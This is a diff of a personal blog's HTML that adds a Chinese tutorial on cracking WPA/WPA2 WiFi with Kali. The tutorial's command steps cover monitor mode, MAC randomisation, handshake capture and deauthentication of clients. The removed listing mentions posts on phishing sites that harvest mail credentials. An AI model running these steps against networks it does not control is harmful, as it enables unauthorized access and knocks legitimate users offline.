@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width initial-scale=1" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
-  <title>Yinan's Blog</title>
+  <title><font color='red'>[原创]</font> 使用Kali破解WPA/WPA2 WiFi</title>
   <meta name="description" content="Welcome to geek's world!">
   <meta name="author" content="Yinan Wu">
   <meta name="HandheldFriendly" content="True">
@@ -43,7 +43,7 @@
   <meta name="theme-color" content="#ffffff">
 
   <link rel="stylesheet" href="/css/main.css">
-  <link rel="canonical" href="https://wuyinan0126.github.io//page2/">
+  <link rel="canonical" href="https://wuyinan0126.github.io//2017/%E4%BD%BF%E7%94%A8Kali%E7%A0%B4%E8%A7%A3WPA-WPA2-WiFi/">
   <link rel="alternate" type="application/rss+xml" title="Yinan's Blog" href="/feed.xml">
 
   <script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script>
@@ -166,83 +166,129 @@
 
     <div class="content-wrapper">
       <div class="content-wrapper__inner">
-        <div class="main-post-list">
+        <article class="post-container post-container--single">
+  <header class="post-header">
+    <div class="post-meta">
+      <time datetime="26 Sep 2017" class="post-meta__date date">26 Sep 2017</time> &#8226; <span class="post-meta__tags">on <a href="/tags/#原创">原创</a> <a href="/tags/#技术宅">技术宅</a> <a href="/tags/#Kali">Kali</a> </span>
+    </div>
+    <h1 class="post-title"><font color='red'>[原创]</font> 使用Kali破解WPA/WPA2 WiFi</h1>
+  </header>
 
-  <ol class="post-list">
+  <section class="post">
+    <p>**</p>
+
+<h2 id="section">使用密码表暴力破解</h2>
+
+<ol>
+  <li>
+    <p>检查无线适配器状态</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # iwconfig
+ wlan0	IEEE 802.11  ESSID:off/any  
+   		Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
+   		Retry short  long limit:2   RTS thr:off   Fragment thr:off
+   		Encryption key:off
+   		Power Management:off
+</code></pre>
+    </div>
+  </li>
+  <li>
+    <p>[可选] 对于运行在virtual box中的虚拟机，需要执行以下命令</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # airmon-ng stop wlan0mon &amp;&amp; ifconfig wlan0 down &amp;&amp; macchanger -r wlan0 &amp;&amp; airmon-ng check kill &amp;&amp; ifconfig wlan0 up
+</code></pre>
+    </div>
+  </li>
+  <li>
+    <p>kill掉可能会造成monitor模式错误的进程</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # airmon-ng check kill
+ Killing these processes:
+   PID Name
+   563 dhclient
+   841 wpa_supplicant
+</code></pre>
+    </div>
+  </li>
+  <li>
+    <p>在wlan0开始monitor模式</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # airmon-ng start wlan0
+ PHY		Interface	Driver		Chipset
+ phy0	wlan0		rt2800usb	Ralink Technology, Corp. RT5372
+ (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+ (mac80211 station mode vif disabled for [phy0]wlan0)
+</code></pre>
+    </div>
+  </li>
+  <li>
+    <p>查看周围的AP和连接上AP的clients，保留运行这个命令的终端</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # airodump-ng wlan0mon
+</code></pre>
+    </div>
+  </li>
+  <li>
+    <p>新开一个终端，监听特定频段和SSID的AP</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # airodump-ng -c 11 --bssid 70:F9:6D:64:B5:60 -w ~/test wlan0mon
+</code></pre>
+    </div>
+  </li>
+  <li>
+    <p>将连上该AP的clients强制下线</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # aireplay-ng --deauth 10 -a 70:F9:6D:64:B5:60 wlan0mon
+</code></pre>
+    </div>
+  </li>
+</ol>
+
+
+    <div class="page_navigation">
     
-      <li>
-        <h2 class="post-list__post-title post-title"><a href="/2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(2)-Hadoop/" title="<font color='red'>[原创]</font> 大数据学习笔记(2)-Hadoop"><font color='red'>[原创]</font> 大数据学习笔记(2)-Hadoop</a></h2>
-        <p class="excerpt"><em>深入学习Hadoop相关知识，并在集群上搭建Hadoop HA平台。包括介绍MapReduce计算框架、HDFS文件系统、YARN资源调度与管理系统、MapReduce和Yarn的参数配置等</em>
-
-&hellip;</p>
-        <div class="post-list__meta"><time datetime="1 Dec 2016" class="post-list__meta--date date">1 Dec 2016</time> &#8226; <span class="post-meta__tags">on <a href="/tags/#原创">原创</a> <a href="/tags/#大数据">大数据</a> </span> </div>
-        <hr class="post-list__divider">
-      </li>
+      <a class="prev" href="/2017/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(9)-NoSQL/">&laquo; <font color='red'>[原创]</font> 大数据学习笔记(9)-NoSQL</a>
     
-      <li>
-        <h2 class="post-list__post-title post-title"><a href="/2016/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(1)-Overview/" title="<font color='red'>[原创]</font> 大数据学习笔记(1)-Overview"><font color='red'>[原创]</font> 大数据学习笔记(1)-Overview</a></h2>
-        <p class="excerpt"><em>系统学习大数据生态圈中的理论知识和常用工具，并通过ansible集群管理工具在12台物理机上搭建分布式的大数据平台，包括Hadoop、Spark、Hive、Zookeeper、Kafka等常用大数据工具及其涉及的理论知识</em>
-
-&hellip;</p>
-        <div class="post-list__meta"><time datetime="16 Nov 2016" class="post-list__meta--date date">16 Nov 2016</time> &#8226; <span class="post-meta__tags">on <a href="/tags/#原创">原创</a> <a href="/tags/#大数据">大数据</a> </span> </div>
-        <hr class="post-list__divider">
-      </li>
     
-      <li>
-        <h2 class="post-list__post-title post-title"><a href="/2016/GitHub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" title="<font color='red'>[原创]</font> GitHub个人博客搭建"><font color='red'>[原创]</font> GitHub个人博客搭建</a></h2>
-        <p class="excerpt"><em>使用Jekyll-Uno模版在GitHub上搭建个人博客，并添加评论和Google Analytics的功能。包括GitHub相关准备工作、本地开发环境的搭建和其它实用工具</em>
+    </div>
 
-&hellip;</p>
-        <div class="post-list__meta"><time datetime="8 Jan 2016" class="post-list__meta--date date">8 Jan 2016</time> &#8226; <span class="post-meta__tags">on <a href="/tags/#原创">原创</a> <a href="/tags/#技术宅">技术宅</a> </span> </div>
-        <hr class="post-list__divider">
-      </li>
-    
-      <li>
-        <h2 class="post-list__post-title post-title"><a href="/2015/Django%E6%90%AD%E5%BB%BA%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/" title="<font color='red'>[原创]</font> Apache2+Django搭建钓鱼网站"><font color='red'>[原创]</font> Apache2+Django搭建钓鱼网站</a></h2>
-        <p class="excerpt"><em>使用Apache2和Django框架搭建163邮箱的钓鱼网站，用于DNS欺骗后将访问163邮箱网站的流量定向到钓鱼网站，并获取邮箱账号和密码</em>
+  </section>
+  <section id="disqus_thread"></section><!-- /#disqus_thread -->
+</article>
 
-&hellip;</p>
-        <div class="post-list__meta"><time datetime="22 Aug 2015" class="post-list__meta--date date">22 Aug 2015</time> &#8226; <span class="post-meta__tags">on <a href="/tags/#原创">原创</a> <a href="/tags/#技术宅">技术宅</a> </span> </div>
-        <hr class="post-list__divider">
-      </li>
-    
-      <li>
-        <h2 class="post-list__post-title post-title"><a href="/2015/%E6%A0%91%E8%8E%93%E6%B4%BE2+ngrok%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" title="<font color='red'>[原创]</font> 树莓派2+ngrok内网穿透"><font color='red'>[原创]</font> 树莓派2+ngrok内网穿透</a></h2>
-        <p class="excerpt"><em>使用树莓派2、虚拟专用服务器(VPS)和ngrok进行内网穿透，使树莓派在局域网外也能通过SSH和HTTP访问</em>
+    <div id="disqus_thread"></div>
+    <script>
 
-&hellip;</p>
-        <div class="post-list__meta"><time datetime="20 Jul 2015" class="post-list__meta--date date">20 Jul 2015</time> &#8226; <span class="post-meta__tags">on <a href="/tags/#原创">原创</a> <a href="/tags/#技术宅">技术宅</a> <a href="/tags/#树莓派">树莓派</a> </span> </div>
-        <hr class="post-list__divider">
-      </li>
-    
-      <li>
-        <h2 class="post-list__post-title post-title"><a href="/2015/%E6%A0%91%E8%8E%93%E6%B4%BE2%E5%88%9B%E5%BB%BA%E9%92%93%E9%B1%BC%E7%83%AD%E7%82%B9/" title="<font color='red'>[原创]</font> 树莓派2创建钓鱼热点"><font color='red'>[原创]</font> 树莓派2创建钓鱼热点</a></h2>
-        <p class="excerpt"><em>使用树莓派2和无线网卡创建钓鱼热点，使其能发射无线信号、分配IP地址、DNS解析、导入流量到钓鱼网站、保存用户信息等</em>
+    var disqus_shortname = 'wuyinan0126';
 
-&hellip;</p>
-        <div class="post-list__meta"><time datetime="27 Jun 2015" class="post-list__meta--date date">27 Jun 2015</time> &#8226; <span class="post-meta__tags">on <a href="/tags/#原创">原创</a> <a href="/tags/#技术宅">技术宅</a> <a href="/tags/#树莓派">树莓派</a> </span> </div>
-        <hr class="post-list__divider">
-      </li>
-    
-  </ol>
+    /**
+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables */
 
-  <hr class="post-list__divider ">
+    var disqus_config = function () {
+        this.page.url = 'https://wuyinan0126.github.io/2017/%E4%BD%BF%E7%94%A8Kali%E7%A0%B4%E8%A7%A3WPA-WPA2-WiFi/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = '/2017/使用Kali破解WPA:WPA2 WiFi'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.title = '/2017/使用Kali破解WPA:WPA2 WiFi';
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = '//wuyinan0126.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function () {
+            var s = document.createElement('script'); s.async = true;
+            s.type = 'text/javascript';
+            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+        }());
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
 
   
-      <nav class="pagination" role="navigation">
-  
-    
-      <a rel="prev" class="posts newer btn small" href="/#blog" title="Previous Page">← Newer Posts</a>
-    
-  
 
-  <span class="pagination__page-number">Page 2 of 2</span>
-
-  
-</nav>
-  
-
-</div>
       </div>
 
       <footer class="footer">
